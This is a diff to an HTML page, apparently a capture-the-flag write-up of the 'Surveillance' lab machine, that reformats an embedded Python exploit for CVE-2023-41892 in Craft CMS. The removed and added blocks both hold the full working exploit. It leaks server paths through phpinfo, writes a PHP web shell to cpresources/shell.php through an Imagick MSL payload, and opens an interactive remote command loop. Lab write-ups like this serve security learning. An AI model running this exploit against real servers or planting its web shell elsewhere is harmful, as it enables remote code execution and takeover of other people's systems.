@@ -82,102 +82,100 @@ We can see there’s a web services running in 80 port and ssh service in 22
     <p><br /><br /></p>
   </li>
   <li>There is a web service powered by Craft CMS in the main page. CVE-2023-41892 is a vulnerability for this technology, we need to execute a POC for this vulnerability, but after a lot of time fixing parameters made by machine configurations we find the right version of the exploit.
-<br /><br />
-```bash
-import requests
-import re
-import sys</li>
+<br /><br /></li>
 </ul>
 
-<p>headers = {
-    “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36”
-}</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-<p>def writePayloadToTempFile(documentRoot):
-    data = {
-        “action”: “conditions/render”,
-        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
-        “config”: ‘{“name”:”configObject”,”as “:{“class”:”Imagick”, “__construct()”:{“files”:”msl:”}}}’
-    }</p>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"</span>
+<span class="p">}</span>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>files = {
-    "image1": ("pwn1.msl", """&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-    &lt;image&gt;
-    &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/&gt;
-    &lt;write filename="info:DOCUMENTROOT/cpresources/shell.php"&gt;
-    &lt;/image&gt;""".replace("DOCUMENTROOT", documentRoot), "text/plain")
-}
+<span class="k">def</span> <span class="nf">writePayloadToTempFile</span><span class="p">(</span><span class="n">documentRoot</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
+        <span class="s">"configObject[class]"</span><span class="p">:</span> <span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
+        <span class="s">"config"</span><span class="p">:</span> <span class="s">'{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:"}}}'</span>
+    <span class="p">}</span>
 
-response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://127.0.0.1:8080"})
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"image1"</span><span class="p">:</span> <span class="p">(</span><span class="s">"pwn1.msl"</span><span class="p">,</span> <span class="s">"""&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+        &lt;image&gt;
+        &lt;read filename="caption:&amp;lt;?php @system(@$_REQUEST['cmd']); ?&amp;gt;"/&gt;
+        &lt;write filename="info:DOCUMENTROOT/cpresources/shell.php"&gt;
+        &lt;/image&gt;"""</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"DOCUMENTROOT"</span><span class="p">,</span> <span class="n">documentRoot</span><span class="p">),</span> <span class="s">"text/plain"</span><span class="p">)</span>
+    <span class="p">}</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s">"http"</span><span class="p">:</span> <span class="s">"http://127.0.0.1:8080"</span><span class="p">})</span>
+
+<span class="k">def</span> <span class="nf">getTmpUploadDirAndDocumentRoot</span><span class="p">():</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
+        <span class="s">"configObject[class]"</span><span class="p">:</span> <span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
+        <span class="s">"config"</span><span class="p">:</span> <span class="sa">r</span><span class="s">'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'</span>
+    <span class="p">}</span>
+
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+    <span class="n">pattern1</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'</span>
+    <span class="n">pattern2</span> <span class="o">=</span> <span class="sa">r</span><span class="s">'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'</span>
+
+    <span class="n">match1</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern1</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+    <span class="n">match2</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern2</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">match1</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">match2</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">match1</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">match2</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">trigerImagick</span><span class="p">(</span><span class="n">tmpDir</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"action"</span><span class="p">:</span> <span class="s">"conditions/render"</span><span class="p">,</span>
+        <span class="s">"configObject[class]"</span><span class="p">:</span> <span class="s">"craft\elements\conditions\ElementCondition"</span><span class="p">,</span>
+        <span class="s">"config"</span><span class="p">:</span> <span class="s">'{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:'</span> <span class="o">+</span> <span class="n">tmpDir</span> <span class="o">+</span> <span class="sa">r</span><span class="s">'/php*"}}}'</span>
+    <span class="p">}</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">shell</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">base_url</span> <span class="o">+</span> <span class="s">"/cpresources/shell.php"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"cmd"</span><span class="p">:</span> <span class="n">cmd</span><span class="p">})</span>
+    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'caption:(.*?)CAPTION'</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+        <span class="n">extracted_text</span> <span class="o">=</span> <span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">extracted_text</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">None</span>
+    <span class="k">return</span> <span class="n">extracted_text</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Usage: python CVE-2023-41892.py &lt;url&gt;"</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">base_url</span> <span class="o">=</span> <span class="s">'http://surveillance.htb'</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Get temporary folder and document root ..."</span><span class="p">)</span>
+        <span class="n">upload_tmp_dir</span><span class="p">,</span> <span class="n">documentRoot</span> <span class="o">=</span> <span class="n">getTmpUploadDirAndDocumentRoot</span><span class="p">()</span>
+        <span class="n">tmpDir</span> <span class="o">=</span> <span class="s">"/tmp"</span> <span class="k">if</span> <span class="s">"no value"</span> <span class="ow">in</span> <span class="n">upload_tmp_dir</span> <span class="k">else</span> <span class="n">upload_tmp_dir</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Write payload to temporary file ..."</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">writePayloadToTempFile</span><span class="p">(</span><span class="n">documentRoot</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="nb">ConnectionError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"[-] Crash the php process and write temp file successfully"</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Trigger imagick to write shell ..."</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">trigerImagick</span><span class="p">(</span><span class="n">tmpDir</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">"[-] Done, enjoy the shell"</span><span class="p">)</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">cmd</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
+            <span class="n">shell</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>def getTmpUploadDirAndDocumentRoot():
-    data = {
-        “action”: “conditions/render”,
-        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
-        “config”: r’{“name”:”configObject”,”as “:{“class”:”\GuzzleHttp\Psr7\FnStream”, “__construct()”:{“methods”:{“close”:”phpinfo”}}}}’
-    }</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>response = requests.post(url, headers=headers, data=data)
-
-pattern1 = r'&lt;tr&gt;&lt;td class="e"&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;td class="v"&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;'
-pattern2 = r'&lt;tr&gt;&lt;td class="e"&gt;\$_SERVER\[\'DOCUMENT_ROOT\'\]&lt;\/td&gt;&lt;td class="v"&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;'
-
-match1 = re.search(pattern1, response.text, re.DOTALL)
-match2 = re.search(pattern2, response.text, re.DOTALL)
-print(match1.group(1), match2.group(1))
-return match1.group(1), match2.group(1)
-</code></pre></div></div>
-
-<p>def trigerImagick(tmpDir):
-    data = {
-        “action”: “conditions/render”,
-        “configObject[class]”: “craft\elements\conditions\ElementCondition”,
-        “config”: ‘{“name”:”configObject”,”as “:{“class”:”Imagick”, “__construct()”:{“files”:”vid:msl:’ + tmpDir + r’/php*”}}}’
-    }
-    response = requests.post(url, headers=headers, data=data)</p>
-
-<p>def shell(cmd):
-    response = requests.get(base_url + “/cpresources/shell.php”, params={“cmd”: cmd})
-    match = re.search(r’caption:(.*?)CAPTION’, response.text, re.DOTALL)</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if match:
-    extracted_text = match.group(1).strip()
-    print(extracted_text)
-else:
-    return None
-return extracted_text
-</code></pre></div></div>
-
-<p>if <strong>name</strong> == “<strong>main</strong>”:
-    if (len(sys.argv) != 2):
-        print(“Usage: python CVE-2023-41892.py <url>")
-        exit()
-    else:
-        url = sys.argv[1]
-        base_url = 'http://surveillance.htb'
-        print("[-] Get temporary folder and document root ...")
-        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
-        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
-        print("[-] Write payload to temporary file ...")
-        try:
-            writePayloadToTempFile(documentRoot)
-        except requests.exceptions.ConnectionError as e:
-            print("[-] Crash the php process and write temp file successfully")</url></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    print("[-] Trigger imagick to write shell ...")
-    try:
-        trigerImagick(tmpDir)
-    except:
-        pass
-
-    print("[-] Done, enjoy the shell")
-    while True:
-        cmd = input("$ ")
-        shell(cmd) ``` &lt;br/&gt;&lt;br/&gt; - 
-</code></pre></div></div>
-
-<p><img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png" alt="Untitled" />
+<p><br /><br />
+<img src="/assets/images/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf/8207f765-d648-4dc3-ba83-0b44a11e6784-export-13ad4084-710c-4cfa-b826-02a6c065cecf_Untitled_2.png" alt="Untitled" />
 <br /><br /></p>
 <ul>
   <li>Make a little bit more stable the bash
